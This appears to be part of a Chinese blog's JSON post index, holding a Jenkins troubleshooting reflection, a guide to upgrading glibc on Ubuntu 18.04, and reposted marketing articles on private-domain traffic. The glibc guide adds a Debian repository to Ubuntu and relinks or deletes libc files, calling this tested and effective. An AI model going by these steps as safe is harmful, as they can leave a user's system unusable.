hudson.maven.AbstractMavenProcessFactory.newProcess(AbstractMavenProcessFactory.java:280)at hudson.maven.ProcessCache.get(ProcessCache.java:236)at hudson.maven.MavenModuleSetBuild$MavenModuleSetBuildExecution.doRun(MavenModuleSetBuild.java:804)at hudson.model.AbstractBuild$AbstractBuildExecution.run(AbstractBuild.java:504)at hudson.model.Run.execute(Run.java:1856)at hudson.maven.MavenModuleSetBuild.run(MavenModuleSetBuild.java:543)at hudson.model.ResourceController.execute(ResourceController.java:97)at hudson.model.Executor.run(Executor.java:428)Caused by: java.io.IOException: error&#x3D;2, 没有那个文件或目录at java.lang.UNIXProcess.forkAndExec(Native Method)at java.lang.UNIXProcess.(UNIXProcess.java:247)at java.lang.ProcessImpl.start(ProcessImpl.java:134)at java.lang.ProcessBuilder.start(ProcessBuilder.java:1029)… 12 moreFinished: FAILURE 本质原因是因为jdk版本升级了,之前的javahome路径失效了导致的. 但是在java升级的那天,我修改了gitee的密码,然后我从一开始就以为是因为凭证出了问题(因为在第一步就是使用凭证拉取git上的项目),然后我又看到timeout&#x3D;10这种提示,以为是真的超时了(其实只是在提示超时时间值,并没有真的超时),然后又是各种搜,各种尝试跟凭证有关的东西,甚至想用sshkey来弄结果不行. 但是其实一开始排查就发现用户名和密码正确,也没有报错,但是就是构建失败,其实这个时候我还是以为拉取失败了,这一步我应该在确认了用户名密码没错并且没报错的情况下,先检查有没有真的拉取到,然后再进行判断的,而不是理所当然的猜测. 然后检查到了其实是拉取到了,跟凭证没关系,往下走发现了java找不到的异常,修改javahome之后就可以了. 正好修改gitee的密码的那天升级了java,才对认知造成了影响. 所以以后如果出现bug,应该一步一步按照事实和异常消息来,并且检查相关配置,而不是盲目百度和把猜测作为事实. =&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 更新 2021-05-19 -U clean install 用于解决 Jenkins构建未拉取最新的包导致自动构建失败","categories":[{"name":"Jenkins","slug":"Jenkins","permalink":"http://blog.ioimp.top/categories/Jenkins/"}],"tags":[{"name":"日常小BUG","slug":"日常小BUG","permalink":"http://blog.ioimp.top/tags/%E6%97%A5%E5%B8%B8%E5%B0%8FBUG/"},{"name":"Jenkins学习","slug":"Jenkins学习","permalink":"http://blog.ioimp.top/tags/Jenkins%E5%AD%A6%E4%B9%A0/"}]},{"title":"Ubuntu 18.04 出现GLIBC_2.28 not found的解决方法(亲测有效)","slug":"Ubuntu-18-04-出现GLIBC-2-28-not-found的解决方法-亲测有效","date":"2023-11-21T10:34:43.000Z","updated":"2023-11-21T10:37:29.586Z","comments":true,"path":"2023/11/21/Ubuntu-18-04-出现GLIBC-2-28-not-found的解决方法-亲测有效/","link":"","permalink":"http://blog.ioimp.top/2023/11/21/Ubuntu-18-04-%E5%87%BA%E7%8E%B0GLIBC-2-28-not-found%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95-%E4%BA%B2%E6%B5%8B%E6%9C%89%E6%95%88/","excerpt":"","text":"Ubuntu 18.04 出现GLIBC_2.28 not found的解决方法(亲测有效)环境12# uname -aLinux Ubuntu 5.4.0-144-generic #161~18.04.1-Ubuntu SMP Fri Feb 10 15:55:22 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux 分析原因glibc是linux底层的API库。通常情况下，有些环境需要glibc更高的版本才支持，比如GLIBC_2.28。 另外对它操作升级，可能有导致系统崩溃的风险。 经验与教训使用GLIBC_xxx的源码包编译升级的惨案: 提醒：在其他博客教程上，有些网友(我也不另外,后面可拯救回来)就按照教程并使用GLIBC_xxx的源码包并去升级，结果往往是系统崩溃而告终。 glibc库对linux系统非常重要，轻易不要更换。如果需要更换，需提前备份好原本的相关库以防万一。 若在使用源码包去升级之后出现segmentation fault,命令无法使用的情况。 解决方法：若安装失败，可能导致各指令出错，除了cd、pwd基本都不可使用，这时候千万不要关闭窗口(如果关闭将导致将无法打开，只能重装系统)，比如安装libc-2.28.so出错了，需拯救系统。可尝试输入其中一条 12345export LD_PRELOAD=/lib64/librt-2.XX.soexport LD_PRELOAD=/lib64/libm-2.XX.soexport LD_PRELOAD=/lib64/libpthread-2.XX.soexport LD_PRELOAD=/lib64/libc-2.XX.soexport LD_PRELOAD=/lib/x86_64-linux-gnu/libc-2.XX.so (XX指原本的版本，看文件夹有哪个就试一下)，然后ls这些指令就可以用了，再使用ln -s把以前的库链接回来。 12345cd /lib/x86_64-linux-gnull # 文件详细信息ln -sf libc-2.27.so libc.so.6 # libc-2.27.so是原有版本rm libc-2.28.so #删除 软件包升级GLIBC_2.281 查看服务器当前版本，命令如下： 1strings /lib/x86_64-linux-gnu/libc.so.6 | grep GLIBC_ 返回的结果如下： 12345678910111213141516171819202122232425262728GLIBC_2.2.5GLIBC_2.2.6GLIBC_2.3GLIBC_2.3.2GLIBC_2.3.3GLIBC_2.3.4GLIBC_2.4GLIBC_2.5GLIBC_2.6GLIBC_2.7GLIBC_2.8GLIBC_2.9GLIBC_2.10GLIBC_2.11GLIBC_2.12GLIBC_2.13GLIBC_2.14GLIBC_2.15GLIBC_2.16GLIBC_2.17GLIBC_2.18GLIBC_2.22GLIBC_2.23GLIBC_2.24GLIBC_2.25GLIBC_2.26GLIBC_2.27GLIBC_PRIVATE 说明服务器当前是没有GLIBC_2.28 2 使用软件包升级方式 参考debian网址并搜索想要的软件或者工具等，如libc6,有结果如下：具体就不介绍了，请浏览官网了解。 添加软件源，/etc/apt/sources.list文件中像下面这样添加一行： 1deb http://security.debian.org/debian-security buster/updates main 系统可用的软件包更新，刷新软件包的缓存 1sudo apt update # 更新软件源 apt-get update之后若出现下面提示：由于没有公钥，无法验证下列签名： NO_PUBKEY 112695A0E562B32A NO_PUBKEY 54404762BBB6E853 1sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 112695A0E562B32A 54404762BBB6E853 其中后面的112695A0E562B32A 54404762BBB6E853就是上面提到的NO_PUBKEY 112695A0E562B32A NO_PUBKEY 54404762BBB6E853中的公钥，替换成对应的即可。然后重新apt-get update即可。 查看软件包可更新列表 1sudo apt list --upgradable 如下图所示： 安装libc6 1sudo apt install libc6-dev /sudo apt install libc6 3 查看服务器当前版本： 1strings /lib/x86_64-linux-gnu/libc.so.6 | grep GLIBC_ 返回的结果如下： 1234567891011121314151617181920212223242526272829GLIBC_2.2.5GLIBC_2.2.6GLIBC_2.3GLIBC_2.3.2GLIBC_2.3.3GLIBC_2.3.4GLIBC_2.4GLIBC_2.5GLIBC_2.6GLIBC_2.7GLIBC_2.8GLIBC_2.9GLIBC_2.10GLIBC_2.11GLIBC_2.12GLIBC_2.13GLIBC_2.14GLIBC_2.15GLIBC_2.16GLIBC_2.17GLIBC_2.18GLIBC_2.22GLIBC_2.23GLIBC_2.24GLIBC_2.25GLIBC_2.26GLIBC_2.27GLIBC_2.28 # 多出该版本，说明安装成功，系统也能正常使用。GLIBC_PRIVATE 如下图所示：","categories":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"http://blog.ioimp.top/categories/Ubuntu/"}],"tags":[{"name":"日常小BUG","slug":"日常小BUG","permalink":"http://blog.ioimp.top/tags/%E6%97%A5%E5%B8%B8%E5%B0%8FBUG/"},{"name":"Linux学习","slug":"Linux学习","permalink":"http://blog.ioimp.top/tags/Linux%E5%AD%A6%E4%B9%A0/"}]},{"title":"私域文章整理【一】","slug":"私域文章整理【一】","date":"2023-11-17T06:08:47.000Z","updated":"2023-11-17T07:24:00.809Z","comments":true,"path":"2023/11/17/私域文章整理【一】/","link":"","permalink":"http://blog.ioimp.top/2023/11/17/%E7%A7%81%E5%9F%9F%E6%96%87%E7%AB%A0%E6%95%B4%E7%90%86%E3%80%90%E4%B8%80%E3%80%91/","excerpt":"","text":"私域流量的那些事情？内容文丨语鹦企服私域管家原创，未经授权不得转载 成功的私域IP可以帮助企业建立独特的品牌形象，增强用户粘性，提高品牌认知度，创造更多商业机会。那么私域IP是什么意思？私域IP和私域流量什么区别？今天语鹦企服就带大家来了解一下~ 私域IP是什么意思？私域IP指的是在私域中打造的个人品牌和影响力的创作者。 在私域中，企业或品牌方可以借助IP进行宣传和推广，以增加品牌影响力和用户粘性。私域IP可以是真实的人物形象，也可以是虚拟人物形象，但都必须具有“人”鲜活的性格特点，有生活、有故事、有情感。同时，私域IP也可以被视为私域流量的人格化表现形式，用户可以通过IP与用户建立情感联系，增强用户粘性和忠诚度。 私域IP和私域流量什么区别？a、私域IP是指企业通过自行拥有的用户数据和关系，包括用户的个人信息、购买记录、行为偏好等，在自行搭建的网络框架下进行IP的打造。私域IP的优势在于可以更好地了解用户需求，提供更加个性化的服务和营销，增强用户粘性和忠诚度。 b、私域流量则是指企业通过自己的渠道获取的流量。私域流量的特点在于，它是由企业能够直接触达用户的，不需要依赖于第三方平台。通过私域流量，企业可以更好地掌握自己的用户群体，了解他们的需求和行为，以便更好地进行产品开发、营销策略的制定等。 私域流量的关键在于建立深度互动，包括： 私域内容：提供有价值的、与目标受众相关的内容，以吸引他们。这可以是定制的文章、视频、独家信息或资源。私域内容要精准、个性化，以满足用户的需求和兴趣。 以\"有棵树\"为例，他们在自家社群中以独特的方式分享宝宝内裤的专业知识，将社群打造成了一个专属的亲子成长学堂。这些信息不仅提供给父母们宝贵的知识，还为他们提供了一个互动的平台，让他们可以分享经验和互相支持。加强了成员之间的联系，提高了社群的粘性。 私域互动：积极与已有客户互动，回应他们的问题、评论、建议。建立社交媒体群体或讨论区，鼓励用户分享经验、建议和产品使用情况。 为了实现这一点，建议企业采用语鹦企服的「跨平台话术库」功能。不同于企微的话术库功能，语鹦企服的「跨平台话术库」支持多种不同形式的内容，包括文本、图片、链接、网页和视频等。企业可以将配置好的内容快速同步到企业微信侧边栏，并允许不同部门单独配置各自的话术库。这一操作简化了顾客问题的回应流程，大大降低了出错的概率。这种改进不仅提高了客户满意度，还带来了效率和准确性的提升。 私域转化：将受众从关注者转化为付费客户。通过提供定制化的服务、个性化的优惠和购物建议，鼓励他们购买产品或使用服务。 企业可以借助语鹦企服设置相应的标签规则在「九宫格&amp;大转盘抽奖」、「刮刮卡」等活动中轻松创建各类活动标签，方便辨别客户喜好，还可以通过语鹦企服的定制功能打通会员系统数据会根据客户的入群渠道、活动参与情况、购买次数等自动为其添加标签。通过这一过程，企业可以逐渐积累客户画像，深入了解他们的需求和购物习惯，从而更有针对性地为客户推荐适合的产品，大幅提高他们的转化速度。 以上就是关于《私域IP是什么意思？私域IP和私域流量什么区别？》的解答了，企业可以利用私域流量建立更紧密的客户关系，提供个性化服务，增加销售机会，并在长期内维护可持续的业务增长。想了解更多关于语鹦企服的功能玩法，欢迎关注语鹦企服！ 语鹦企服私域管家 (http://crm.bytell.cn): 基于企业微信的新一代SCRM工具。集合员工活码、超级活码、好友裂变、社群裂变、无限群活码、自动拉群、关键词进群、跨平台话术库、历史朋友圈、个性化欢迎语、会话存档、进退群分析等众多工具于一身，欢迎免费体验。 文章详细url:https://api.zhihu.com/answers/3287550484私域流量是什么？普通人该怎么做？内容什么是私域流量，可以看下我这篇回答。 天天说私域流量，那你知道最底层的操作是什么嘛？ 看完就应该明白什么叫私域了 文章详细url:https://api.zhihu.com/answers/3221766776什么是私域？内容在最近的新消费浪潮中，越来越高的获客成本使得“私域”和“会员制”成为众多品牌俘获用户的关键战术。有一段时间，似乎各个品牌都开始在私域和会员上发力了。很多人其实不知道私有域和会员的区别，甚至有人认为两者是同一个体系。即使是那些建立了会员制的企业，仍然有许多问题。比如我的会员平台搭建好了，为什么对用户没有吸引力？我的会员有那么多积分，为什么会员不愿意兑换？ 1.私有域和会员有什么区别？ 针对不同的业务场景，私域和会员各有优势。私域是一个很好的帮助运营成长的工具，但是私域系统不是所有场景都能用的。在不同的企业规模和销售模式下，两者的优先级体系是不同的。 第一，大企业+直营，优先考虑私域。低消费高客单价的直营，意味着用户需要大量的服务。成为会员很难对用户的心智产生很大的影响，所以更适合私域。 第二，大企业+经销商，会员优先。经销商最大的价值是触达更多用户，会员体系可以穿透经销商触达用户，获取数据。相反，将用户入驻私有域池是非常困难的，经销商会有不安全感。一个设计良好的会员体系，既可以作为经销商帮助其服务用户的弹药，又不会损害经销商的权益。 第三，小企业可以把私域和会员当一回事，把会员的权益放在你的私域体系里就好了。 在不同的场景下，私域和会员制各有优势，在具体业务落地时，需要根据公司情况具体分析。 会员制度在我们的日常生活中无处不在。无论是坐飞机的会员卡，还是每天去超市买咖啡的积分卡，都是品牌基于会员体系连接消费者。有以下五种常见形式: 1.整体系统 以星巴克为例。一杯咖啡可以累积0.3颗星，消费者可以用30杯咖啡换取一杯免费咖啡。很多商场也是如此。你花100块钱存一分，100分就值一块钱。如果是零售业态，你不需要太在意它是否服务于用户整个生命周期的不同产品和服务。你可以用一个简单的积分系统。 2.跨行业合作系统 以日本的咲夜书店为例。它80%的收入来自会员卡，日本1.2亿人口中有7000万是它的会员。与多家连锁洗头店、美容院、餐厅等合作。在这些店铺消费时，可以积累积分，积分可以在所有店铺兑换成现金。在这个会员制中，严武书店相当于一个“银行”的角色。它设计了一个类似于“汇率”的概念，用来指定用户在不同商店的消费转换成现金的比例。其他店只需要决定多少参与这个系统。 这种方法适合服务于一些圈子用户的公司，比如核心用户是一些高净值客户，或者是亲子领域的早教机构、拍摄机构。 3.行为货币化系统 在这种模式下，用户积分的来源不仅与消费挂钩，还与用户的一些其他行为相关。现在一些互联网公司就是这样建立会员体系的。根据平台积分的多少，对应不同的会员等级。这种方法适合纯线上公司，可以统计用户的很多行为。 4.用户合作创新系统 花溪子就是这种制度的典型。当你成为花溪子的联合创始人，加入会员制，每推出一款新品，你都可以申请产品试用，成为体验官。那些申请试用的用户可能会发朋友圈推广产品，这就完成了用户的共创。如果产品服务于有共同喜好的人群，或者一些小众群体，更适合用户打造的这套会员体系。 5.付酬制度 最后一种是常见且经典的方式——支付系统。我需要支付一笔钱购买会员资格，从而获得额外的利益。那么付费会员卡是如何吸引消费者付费的呢？ 一般所有公司付费会员卡的开卡逻辑都是“花、赚、存、享”四步开卡逻辑。 第一步，花钱，交会员费。 第二步是，缴纳会员费后，一般可以获得一些礼包。在产品设计上，一般100元会员费对应的开卡礼包价值150-250块，包括低价产品、感知价值高的产品、刚需高频的服务等。例如，山姆俱乐部将提供牙齿清洁服务，以及免费现金折扣。 第三步，省钱。具体形式是购物反馈。会员在购物时会积累积分，可以给他们更多的折扣。 第四步是享受，一般是指享受一些特权。比如携程钻石卡会有龙腾旅行休息室、快速安全通道、KTV免费一小时的特权。 三、会员制建设四部曲: 分级、评分、降级和管理 接下来我们就来说说构建会员体系的关键步骤，主要分为四个部分:用户分级、设计积分获取规则、用户升级和降级规则、构建会员管理体系。 第一步，给用户打分。 品牌可以从消费水平和用户年龄段对用户群体进行分类。在每个群体中，又可以从消费价格、消费频率、消费排名三个角度进一步区分。其他维度，如地域、价格敏感或服务敏感，也可以作为参考。所以在思考如何对会员进行分类分级的时候，可以选择分析用户行为的深度。你选择什么样的设计方法，取决于你想在这个会员体系中激励用户采取什么样的行为。在用户群体分层中，有一群人需要特别关注——那些即将升级的会员，他们需要专注于营销。当我们看到某个用户即将进行数据层面的升级时，要通过各种手段提醒他——弹窗曝光、发短信、EDM等。，并提醒客户完成几个动作，实现会员升级，享受更多权益。 第二步是设计积分获取规则。 获得的积分分为来自用户的动作、来自用户的交易和来自用户的交流。如何得到这些点，是品牌要设计和定义的规则。 通常是以下三种。 第一种是通过用户消费获得的。花费的金额越高，获得的积分就越多。 二是通过用户在产品端做一些操作来获得积分。比如登录、打卡或者使用新功能等日常操作，或者用户参加一个大活动就可以获得双倍积分。 三是通过用户的传播来积累积分。比如转发帮助品牌增加读者数量，促进交易数量，用户本身获得积分。 以支付宝为例。支付宝积分的获取方式有很多种。可以通过消费购物、生活缴费、理财等交易获得积分。还可以在支付宝里做一些用户行为，比如做任务积累积分。 第三步:用户升级降级规则。 设计好用户获取积分的规则后，接下来就要考虑如何让用户主动想要获取积分。换句话说，如何制定会员升级和降级的规则，涉及到如何通过消费刺激即将升级的会员立即升级，以及如何将即将离世的会员留在队伍中。这样做的本质是利用了用户的厌恶损失心理和即时心理。如果会员来的时间不长，提醒他还有200分快到期了。你想把它们换成礼物吗？在这里你可以思考，用户真的不愿意存分吗？ 不是，只是用户觉得你的积分没用。好的积分兑换系统可以帮助用户在积分权益类产品的激励下选择和使用更多的产品。 第四步，搭建会员管理系统。 要长期留住用户，涉及到会员的管理体系，分为四个部分。 1、产生荣誉感和认同感。 品牌要想好怎么做，能让用户觉得荣幸成为你的会员，使用你的会员权益。比如当用户普遍成为航空公司金卡或者银行的私人客户，就会有这样的荣誉感。 这里有三种传统的运作方式，可以让成员有一种认同感: 首先是会员日活动的策划。之前我们和客户云南白药一起策划了云南白药的会员日——选择闭店一天，只邀请VIP会员到店，五折购买，利用会员日活动回馈会员。 二是体验官的活动策划。比如让花溪子和成员共同创作，然后挑选有能力输出内容、感受细腻细节的人，让他们成为体验官，免费使用产品出谋划策，帮助传播。 三是会员线下见面日。我们在服务银行客户的时候，会做这样的活动，比如一些沙龙活动或者亲子活动，让用户之间有更强的联系。 2.设计权和激励制度。 这一点也很重要。一般来说，可以从“付费产品变免费”、“稀缺产品变免费”、“不断更新权利和激励”、“通过跨行业合作和跨界合作获取更多资源”四个角度来做。 3.注意风险点。 会员管理中也会出现几个与积分相关的典型风险点，需要特别注意。首先，会员积分是一种市场成本，因为会员必须兑换。因此，公司需要每年计算会员未消费的积分。 第二点就是要点要注意限定和上限。比如会员积分数不超过50万，或者会员积分数累计不能超过3年，否则会被清零。如果你的会员系统中有大量未消费的积分，你将进入一个通货膨胀的积分系统，这将影响整个财务状况。 4.构建分阶段会员体系。 会员制是一个系统工程，有很多细节。对于我们来说，建立一个分阶段的会员制度会更成功。先构建会员制的基本框架，再构建激励推广的框架，最后构建持续运营的框架。这是会员制取得全面成功的三个关键步骤。对于每一个企业来说，都需要不断思考如何构建反向触达用户的体系，从而实现与用户的有效沟通。会员制正在帮助企业构建这个过程。好的会员体系会让用户重复“主动来企业”的动作，进而加深与企业产品或服务的联系。 根据不同的格式，相应匹配私有域或会员的形式；然后，根据企业业务场景，匹配最适合的会员形式，进而构建基于四部曲的会员体系。这样，在一个好的会员体系中，用户才会愿意和企业保持粘性，才能真正帮助企业的业务越做越好。 文章详细url:https://api.zhihu.com/answers/2913050839私域运营是什么？如何通过私域裂变获客？内容运营私域流量前，先要弄懂什么是私域流量？ 一、什么是私域流量？所谓的私域流量，其实就是品牌或个人所拥有的、可以自由控制、多次利用的、免费且能够直接触达用户的流量。 私域流量对比公域流量的优势，也是清晰可见的。 1、什么是好的私域流量载体？微信是离用户最近的群体，最有价值的私域流量就是让客户添加个人微信号，或者添加企业微信个人号。 主要基于以下4点考虑： ①微信是当前社交平台用户最多的平台，用户高达11亿，覆盖的人群广，使用频率高，并且能不用花钱就快速触达用户，是企业私域流量池搭建的首选。 ②有朋友圈这个场景，更有利于长期经营用户 ③腾讯生态完备，社交做得最好，还有微信支付 ④个人微信是相对封闭的社交环境，封闭环境使流量可以以流量池的形式存在 2、私域流量的本质在搭建私域流量前，先了解私域流量的本质是什么？私域流量的本质主要有这4点考虑： ①流量的所有权和使用权的归属问题 ②从流量思维转变为经营用户思维 ③核心是经营用户以及经营和用户的关系 ④不是纯粹的销售导向，不是视用户为韭菜，不是收割的逻辑 基于以上考虑，私域流量不是把用户引流到微信就完事了，而要为用户持续性输出内容，通过内容营销触达用户，最终完成购买等转化。 易企秀营销内容中台，助力企业内容驱动增长的数字新基建 二、什么是内容营销？百度定义：内容营销，指的是以图片、文字、动画等等介质传达有关企业的相关内容来给客户信息，促进销售，就是通过合理的内容创建、发布及传播，向用户传递有价值的信息，从而实现网络销售的自的。他们所依附的载体，可以是企业的LOGOCV画册、网站、广告，甚至是T恤、纸杯、手提袋等，根据不同的载体，传递的介质各有不同，但内容的核心必须是一致的。 所以我认为内容营销是在各大主流社交媒体上，向自已的潜在用户，输出他们所关心的、不同形式的内容，并进行良好的互动，然后连接用户，筛选用户，从而获得源源不断有效销售线索的营销行为。 ①内容营销是连接用户，筛选用户，不是主动去找用户，而是让用户主动找你； ②“高压线”不要碰！内容要符合社会主义核心价值观 ； ③内容营销不仅仅是为了获取阅读量、粉丝量、点赞量、播放量 ； ④各大主流社交媒体平台的红线不要碰！要遵守TA们的算法和游戏规则 ； ⑤一旦一个公司做内容营销，町着阅读量、粉丝量、点赞量、播放量，就一定不会成功； ⑥内容营销不是什么文章火，就发什么文章 ！ 搭建私域流量池，一定是从用户思维的角度出发，而不是为了流量而搭建私域流量池。 易企秀营销内容中台，助力企业内容驱动增长的数字新基建 三、通过内容营销搭建私域流量1、企业内容营销的内容从哪里来？产品维度一一讲好产品的价值、特点、用户体验和与众不同之处 公司维度一一公司为做好这个产品所发生的一系列的故事。这里面包括公司的价值观文化理念、创始人的情怀、公司的动态、获得的荣誉。 行业维度一一这个行业整体是什么情况？有哪些变化？公司改变行为所付出的努力。 用户维度一一站在用户角度看问题，看这个行业、这个产品。用户有哪些诉求抱怨我们如何去解决用户的问题。 做内容营销其实就是做信任，通过内容获得用户的信任。 因此需要告知用户，你是谁？你是做什么的？为什么相信你？ 网络虚拟世界的信任主要有六大来源： 如何增加个人信任度和专家感？ 1、熟悉产生信任 2、信任产生于“专家感” 信息内容的识别：内容要聚焦于某个细分行业，杂乱无章则不会产生信任。 企业可以通过360度全方位立体式输出内容。 纯粹接触效应：人们看到的某样东西的次数越多，对其喜爱的程度就越高。因为熟悉所以喜 欢，信任便产生于此。 2、公域内容营销平台的选择内容营销的平台有很多，企业可以结合自己本身的业务，和平台的调性，选择适合企业的内容营销平台。 例如：抖音、快手、微信、微博、以及各种自媒体号。 在公域流量池，通过内容营销链接和筛选用户，将用户引流至私域流量。 易企秀营销内容中台，助力企业内容驱动增长的数字新基建 四、私域流量要怎么运营？企业建立私域流量后，接下来最重要的就是私域用户的运营。 以瑞幸的私域举例，看看瑞幸是怎么做私域运营的？ 一、品牌数字化布局 1、小程序+APP数据打通 微信小程序，与APP的数据打通，只要输入手机号，多个渠道数据互通（无论小程序、瑞幸APP 、公众号领券，使用手机号登录就可识别。 小程序购买下单，可以领取积分，在APP下单可以领取双倍的积分，有刻意引导用户下载APP，这样增加了触达用户的渠道。 2、基于门店&amp;企微双向导流 瑞幸咖啡设置了多渠道，以4.8折优惠券、100元新人券等为利益点，将用户引流至企业微信，采用LBS的方式引流到附近门店员工企微号。 再通过设置优惠券等自动回复信息，引导粉丝扫码加入企业微信群，利用社群做精细化运营，高效转化变现。 从小程序引流到最近门店，可以提醒用户瑞幸线下门店的存在，增加了门店的潜在客户。 二、品牌渠道流量分配 1、线上私域引流 瑞幸通过微信公众号、微信视频号、视频号直播等各个公域渠道，采用4.8折券吸引用户，引导用户添加企微再领券。小程序主页空间也尽可能多的放进更多内容，充分利用首页承接“用户第一眼”的优势。 2、线下门店引流 在门店的取餐处，又放了引导加线下门店群的二维码，这样通过门店门店或者外卖消费，没有进群的顾客，又形成私域回流，促进顾客复购。 通过大量的快销店，瑞幸就能够将自己的庞大的线下用户群，转移到自己的私域流量池 三、私域运营的定位和价值 1、企微运营 瑞幸的企微账号名称以首席福利官lucky为主，主要就是发福利，与人设比较吻合，采用卡通形象增加亲切感。每周都会有发券提醒，刺激老用户复购。 添加好友后，会有对应的欢迎语领券引导，针对新用户和老用户会有不同的折扣，进入门店社群，还会继续分时段推送不同的领券提醒。 同时，平均每天还会发1至2条朋友圈，推荐门店出的新品，引导领券，引导直播间参与抽咖啡互动，关注公众号抽券等。 2、品牌联名活动 瑞幸通过和椰树等知名品牌，实现跨界联名活动，不仅能得到很高的关注度，还可以在短时间内提升销售额。 3、冲榜福利冲榜福利，刺激用户短期内复购，同时满足有爱好收集任务的勋章墙人群，以此刺激回购。 瑞幸的引流策略，瑞幸在做活动这个方面是毫不吝啬的，非常聪明的采用了线下和线上相结合，线下门店与线上渠道相辅相成的方式持续引流。 通俗的说前期依靠公号、视频号、线下门店易拉宝、活动等进行引流，中期依靠企业微信个号、社群来承接流量，最后依靠小程序不断的增长转化。 这套私域运营模式，不仅成为瑞幸能打败库迪的底气，还给瑞幸带来了稳定的客源复购，实现了赚钱。 搭建门店、APP/小程序、社群的零售快消数字运营体系，再接入创意内容中台，源源不断地及时产出创意内容，抓住营销节点，激活用户参与活动，领取优惠券，不断盘活私域流量，从线上引流到门店进行消费转化。这套成熟的门店引流打法中，内容是一个撬动点。 好的营销模式都是可以借鉴的，如果您也对零售快消行业的社群小程序门店联合运营感兴趣，建议你及时了解私域运营的最新玩法，接入易企秀内容中台，还可以打通自有奖品积分库，快速高效发放福利优惠券，引流用户到门店形成转化。 易企秀营销内容中台，助力企业内容驱动增长的数字新基建 文章详细url:https://api.zhihu.com/answers/3201175580公域转私域如何能快速加粉到私域？内容私域似乎都已经被说倦了，2023年，私域营销还重要吗？ 很多运营同行反馈，听了很多道理，依旧做不好私域。很大的原因就是没有“对症下药”。 面对不同的业务，如何做私域？为此，36氪企服点评有幸邀请到见实创始人徐志斌，分享了《从走量到走心，2023会是私域大涨年吗》直播。徐志斌从理论和案例出发，解答了私域的本质，如何做私域，私域营销工具（SCRM）如何选择等问题。 我们从用户处收集了100+的私域问题，以下为精选的8个问答，希望能对您有帮助。 1.私域营销在2023年重要吗？今年开年第一个月，在各类新闻中大洋彼岸硅谷裁员至少10万起。国内很多公司也在推进降本增效。但是通过看前程无忧2022年的招聘数据，我们发现：私域这个岗位不降反增，是很罕见的还在快速增长的部门。因为没有新的增量，企业会加大对新老客户的扩展销售，做复购和ARPU的提升。 一个小例子是：今天直播前我还在和一家品牌沟通，他们自有品牌1个月私域流水是100万，但是一个月私域中销售其他关联商品竟有400万销售额。这是私域能带来的增量。 因此，私域在2023年依旧重要，对于GMV和复购,ARPU的提升作用，答案都是确定的。 2.2023，私域还是拉群发券吗？第一，社群运营，某种程度上等同于私域运营。 因为社群有生命周期，社群的活跃率，转化率，响应率，复购率都在逐年下降，这是没有办法的事情。但是用户维系、转化产品，都需要在群里，所以社群还是很关键。 第二，会员运营，某种程度上等同于私域运营。 会员的运营体系非常重要，这决定了GMV的增长空间。 第三，面向用户的精细化运营，会是今年很重要的一个点。 第四，全域运营成为大部分“牛”品牌的选择。 绝大部分牛的团队，都开始做全域的组合和运营。运营不再是拉群和发券，会有更多新的组合和玩法。 3.全域营销如何做？全域营销现在浮现了一些效果很好的运营组合。如： 去年年底，很多连锁的线下品牌开始在各大公域平台投放同城广告，如我们刷不同城市会看到一些餐饮连锁有9.9元、19.9元的网红款，吸引精准用户到线下核销。到了门店，店员引导客户注册会员，加入私域池。 以广告的方式，结合地理位置和精准人群画像，引导线下消费，继而引导到私域，这是新的双轮驱动方式。 还有很多品牌在小红书投放种草，在私域拔草，这个效果也很好。 接下来会有更多组合出现，很多建立在全域上的货、渠道等理念和思路都会有新变化。也会特别依赖数据系统的打通和运用。 4.私域运营如何选择SCRM厂商？首先，选择SCRM的前提是业务已经跑通。对绝大公司来说，刚开始做私域运营时，可以先用工具解决业务需求，当用户量和收入的问题解决了，再考虑选用什么SCRM系统。因为你已经知道问题和需求在哪里，根据服务商的回复，就能很容易知道对方是否适合。另外，各家SCRM服务商都是根据企业微信的API、SDK去开发的，所以功能和权限都大同小异。几个方面会帮助选择： （1）服务能力 服务商的服务能力和响应速度至关重要。当商家就运营提出使用困惑时，对方的回复是事无巨细，还是言简意赅，区分会很大。 （2）需求产品化的能力 运营提交了一个新的需求，服务商是否能快速完成迭代更新？ （3）成熟方法论 做私域时，工具重要，方法论更重要。不同行业的玩法是不同的，某家SCRM厂商是否在对应行业中有客户优势、具有相应行业成熟的方法论，能否指导企业做增长、留存、转化，至关重要。 5.低频高客单价如何做私域？低频高价的企业做私域的第一核心和关键点是提升频次，提升品牌与用户接触交流的频次。卖房子，卖汽车，家居，装修，在线教育等，这都属于高单价，低频次的产品。 以装修为例，这个行业是长期低频，短期高频，用户在短期内会进行大量的搜索，看样品，装修城看建材，是否环保，装修风格，询价等等，运营方就可以对应铺专业文章、直播、短视频等，引流到私域，如果专业度强，可以引入付费环节，因为购买是一切关系的基础，如设置9.9元的顾问服务、咨询、课程等，用户可以随时咨询专业问题，同步发起进群讨论、逛建材城、集体砍价，团购等等。 这样，用户的行为习惯会全部变成触点，我们和用户接触的频次会大幅度提升，成交也是顺其自然的事情。 6.有没有什么和用户建立长期关系的好方法？购买是一切关系的基础。 和上面提到的低频行业提升频次的出发点一致，如在线教育中，家长花9.9元购买小课包+学习礼盒；蔚来汽车当用户交了小额定金后，就会组建专门的服务小群。通过付费，顾客与品牌建立了长期的服务关系，销售人员可以通过售后服务来提升转化。 另外，低频的产品客单价一般比较高，购买人群都是高净值人群。这时候，转介绍就显得格外重要。豪车可以说是低频高价的私域样板，为车主提供超预期的服务，当车主发朋友圈炫耀的时候，转介绍其实也就完成了。同时，当客户将这些靠谱的产品和服务介绍给朋友时，对他来说是社交加分项。 7.ToB行业如何做私域？TO B行业最大的困惑就是如何获得精准线索，我们主张是“让用户主动来找你”？最靠谱的方式就是深度专业有体系的内容。比如：精准案例、白皮书、深度文章等，对用户来说特别有用。这些也是目前TO B行业中传播的基础用法。 8.搭建团队布局私域的时候，有什么需要注意的？（1）组织架构 做私域，首先要碰到组织架构变革，优化升级调整。比如全员营销，分销制度，KOL改造等等。 （2）团队协调 整个团队需要目标一致，协调统一，权责明确。当一把手带领团队把事情一次又一次做成，获得一次又一次的胜利时，私域营销就可以积小胜为大胜。 （3）部门分配 37.38%的公司开始成立专门的私域一级部门来做，如果没有私域部门，那么市场，用户增长，运营部，电商零售大会员等部门可以领导私域，因为他们和私域是强相关的。 